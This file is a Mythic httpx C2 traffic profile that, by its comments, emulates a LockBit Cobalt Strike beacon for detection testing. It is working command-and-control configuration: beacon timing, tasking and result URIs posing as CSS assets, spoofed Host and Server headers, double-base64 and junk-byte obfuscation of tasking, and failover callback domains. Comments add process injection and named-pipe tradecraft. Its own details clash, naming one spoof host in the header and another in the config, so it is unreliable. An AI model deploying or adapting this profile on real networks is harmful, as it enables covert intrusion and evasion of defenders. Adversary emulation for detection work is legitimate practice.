# Mythic httpx profile - LockBit affiliate beacon (financial sector)
#
# Reproduces the malleable Cobalt Strike profile The DFIR Report recovered from a LockBit
# intrusion (the actor family behind the Nov-2023 ICBC broker-dealer breach via Citrix Bleed,
# CVE-2023-4966). Emulation, not real malware: this is traffic-shaping config for Apollo.
# Source: thedfirreport.com/2025/01/27 (LockBit + Cobalt Strike). ATT&CK: T1071.001, T1573,
# T1090, T1572, T1001.003, T1132.001.
#
# Documented indicators reproduced here:
#   - sleep 62,760 ms with 37% jitter
#   - GET /_next.css  (masquerade as a Next.js static asset), POST /boards (app endpoint)
  #   - Host-header spoof: assets-portal.io (fake SaaS/CDN name, not a real registered domain)
#   - server tasking transform: strip 814 leading junk bytes, then base64-decode twice
#   - (agent-side, set in Apollo build, NOT in this profile): inject into wuauclt.exe,
#     SMB named pipe fullduplex_84 for P2P, JA3 a0e9f5d64349fb13191bc781f81f42e1
#
# CAVEAT: validate against the current MythicC2Profiles/httpx examples/_index.md schema and the
# httpx (or Tyche) linter before building; field names can drift between httpx releases. The 814
# junk bytes below are abbreviated for readability - paste the full block from the source CS
# profile, or import that CS profile through Tyche, to match byte-for-byte.

name = "lockbit-icbc"
callback_interval = 62
callback_jitter = 37
killdate = "2026-12-31"

# ---- Egress rotation: real listener first, aged benign-sounding fallback domains ----
# The Host-header / Referer spoof (user.compdatasystems.com) is the DOCUMENTED LockBit
# indicator being reproduced for detection testing (see detections/elastic-sysmon.md N4).
# It is the DETECTION ARTIFACT, not a DNS target we resolve in the lab.
# The callback_domains below are where the traffic ACTUALLY lands in the lab: fake
# SaaS/CDN names only, never real registered names.
callback_domains = [
  "https://cdn-metrics.io",      # fake SaaS/CDN name for threat realism
  "https://static-bucket-cdn.net", # fake fallback
]
domain_rotation = "fail-over"
failover_threshold = 5

# ================================ GET (tasking pull) ================================
[get]
verb = "GET"
uris = ["/_next.css"]

  [get.client]
  headers."User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  headers."Host" = "user.compdatasystems.com"
  headers."Accept" = "text/css,*/*;q=0.1"
  headers."Referer" = "https://user.compdatasystems.com/"

    # Beacon metadata rides in a cookie on the GET (CS default shape)
    [get.client.message]
    location = "cookie"
    name = "__cf_bm"

    [[get.client.transforms]]
    action = "base64"

  [get.server]
    # Response masquerades as a CSS static asset
    [get.server.headers]
    "Content-Type" = "text/css; charset=utf-8"
    "Cache-Control" = "max-age=0, no-cache, no-store, must-revalidate"
    "Server" = "cloudflare"

    # Server output = prepend 814 junk bytes, then base64 twice.
    # Client reverses in reverse order: base64-decode twice, then strip the 814-byte prefix.
    [[get.server.transforms]]
    action = "base64"
    [[get.server.transforms]]
    action = "base64"
    [[get.server.transforms]]
    action = "prepend"
    value = "/*! For license information please see main.js.LICENSE.txt */ .ABBREVIATED_REPLACE_WITH_814_BYTES_FROM_SOURCE_PROFILE_OR_IMPORT_VIA_TYCHE" # noqa: real profile prepends exactly 814 bytes

# ================================ POST (result callback) ================================
[post]
verb = "POST"
uris = ["/boards"]

  [post.client]
  headers."User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  headers."Host" = "user.compdatasystems.com"
  headers."Content-Type" = "application/x-www-form-urlencoded"

    # Results ride in the POST body
    [post.client.message]
    location = "body"

    [[post.client.transforms]]
    action = "base64"

  [post.server]
    [post.server.headers]
    "Content-Type" = "text/html; charset=utf-8"
    "Server" = "cloudflare"
